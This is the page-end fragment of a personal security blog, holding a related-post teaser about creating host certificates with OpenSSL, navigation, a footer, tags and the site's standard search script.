class="card-body"> <span class="timeago small" > Apr 7 <i class="unloaded">2021-04-07T21:03:48+10:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OpenSSL Creating a Host Certificate</h3><div class="text-muted small"><p> In this post we’ll look at how to create our own Host Certificates using OpenSSL. These certificates can be used on web-servers for enabling TLS. A valid CA Certificate and Private key will be req...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/ssh-server-hardening/" class="btn btn-outline-primary" prompt="Older"><p>SSH Server Hardening</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/twitter_username">Alexander Wells</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/javascript/">javascript</a> <a class="post-tag" href="/tags/nodejs/">nodejs</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/https/">https</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/http/">http</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/express/">express</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://node-security.com{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
